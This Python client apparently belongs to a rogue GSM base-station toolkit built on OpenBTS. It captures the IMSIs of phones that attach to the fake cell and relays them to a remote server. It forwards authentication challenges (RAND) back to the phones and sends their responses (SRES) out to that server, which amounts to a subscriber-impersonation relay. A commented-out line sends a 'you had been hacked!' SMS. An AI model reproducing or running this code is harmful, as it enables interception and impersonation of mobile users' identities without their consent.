import socket
import json
import base64
import threading
import time
import os
import sys


'''
import socket
import os

UNIX_SOCK_PIPE_PATH = "/var/run/command"
os.system("rm -rf /tmp/OpenBTS.do")
LOCAl_PIPE = "/tmp/OpenBTS.do"
sock = socket.socket(socket.AF_UNIX,socket.SOCK_DGRAM)
sock.bind(LOCAl_PIPE)
sock.connect(UNIX_SOCK_PIPE_PATH) 
sock.send(b"help")


a = sock.recv(1024)
print(a.decode())
'''

from Utils.Log import*
from Utils.Constant import*
from Utils.Load_Config import*
init(autoreset=True)


class Client:
    def __init__(self,rport,rhost,lport):
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_socket.connect((rhost, rport))
        LOG(SUCCESS,f"Success to connect the remote server(TCP) "+rhost+":"+str(rport))

        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind(('127.0.0.1',lport))
        self.server_socket.listen(1)
        LOG(PROCESS,f"OpenBTS local server(TCP) is listening on "+str(lport))

        os.system("rm -rf /tmp/OpenBTS.do")
        self.OPENBTS_PIPE = "/var/run/command"
        self.LOCAL_PIPE = "/tmp/OpenBTS.do"
        self.unix_sock = socket.socket(socket.AF_UNIX,socket.SOCK_DGRAM)
        self.unix_sock.bind(self.LOCAL_PIPE)
        LOG(PROCESS,f"OpenBTS local client(UNIX SOCKET) success to bind "+self.OPENBTS_PIPE) 
        
        config = load_imsi_black_list()
        self.max_imsi_quantity = config["max_imsi_quantity"]
        self.blacklist = config["blacklist"]

        self.tmsis_table = []

        
    def Query_For_IMSI(self,imsi):
        if len(self.tmsis_table) > self.max_imsi_quantity:
            LOG(WARNING,"The number of imsi has reached the upper limit, reject it.   Upper_limit:"+str(self.max_imsi_quantity))
            return False
        #print(self.blacklist)
        if imsi in self.blacklist:
            LOG(WARNING,"The imsi: "+ imsi + " is in the blacklist,reject it.")
            return False
        return True

    def send_auth_req(self,imsi,rand):
        #cmd = "./OpenBTSDo \"sendsms " +imsi+" 100000 " + "you had been hacked! \""
        try:
            self.unix_sock.connect(self.OPENBTS_PIPE)
            cmd = "sendsms "+imsi + " 10086 " +rand
            self.unix_sock.send(cmd.encode())
            LOG(SUCCESS,"Success to send rand to OpenBTS")
        except:
            LOG(ERROR,"Failed to send rand to OpenBTS. is OpenBTS running?")

    def openbts_server(self):
        while True:
            conn, addr = self.server_socket.accept()
            LOG(SUCCESS,"Server is connected by OpenBTS")
            raw_msg = conn.recv(1024)
            msg = raw_msg.decode()
            LOG(PROCESS,"Received msg form OpenBTS: "+msg)
            if ";" in msg:
                parts = msg.split(";")
                imsi = parts[1]
                data = json.dumps({"EVENT":"SIP","IMSI":imsi})
                if self.Query_For_IMSI(imsi):
                    if imsi not in self.tmsis_table:
                        self.tmsis_table.append(imsi)
                    LOG(SUCCESS,"[From OpenBTS-"+str(addr)+"] EVENT:SUBSCRIBE IMSI:"+imsi+",now send to remote server")  
                    self.client_socket.send(data.encode())
                    conn.send(b"1")
                else:
                    conn.send(b"0")
            else:
                LOG(SUCCESS,"[From OpenBTS-"+str(addr)+"] EVENT:AUTHORIZATION SRES:"+msg+" ,now send to remote server")
                data = json.dumps({"EVENT":"AUTH","SRES":msg})
                self.client_socket.send(data.encode())


    def send_heartbeat(self):
        while True:
            msg = json.dumps({"EVENT":"HEARTBEAT"})
            self.client_socket.send(msg.encode())
            LOG(PROCESS,"Sending HEARTBEAT")
            time.sleep(5)
    def recv_auth_res(self):
        while True:
            data = self.client_socket.recv(1024)
            if data == b"ok" :
                LOG(PROCESS,"Receive HEARTBEAT respond")
                pass
            else:
                data_dict = json.loads(data.decode())
                print(data_dict)
                imsi = data_dict['IMSI']
                rand = data_dict['RAND']
                LOG(SUCCESS,"Received authorization request for server! IMSI:"+imsi+" RAND:"+rand)
                self.send_auth_req(imsi,rand)
            
            
    def run(self):
        threading.Thread(target=self.send_heartbeat).start()
        threading.Thread(target=self.recv_auth_res).start()
        threading.Thread(target=self.openbts_server).start()





if __name__ == "__main__":
    rhost = sys.argv[1]  # 第一个参数
    rport = sys.argv[2]
    client = Client(int(rport),rhost,6666)
    client.run()
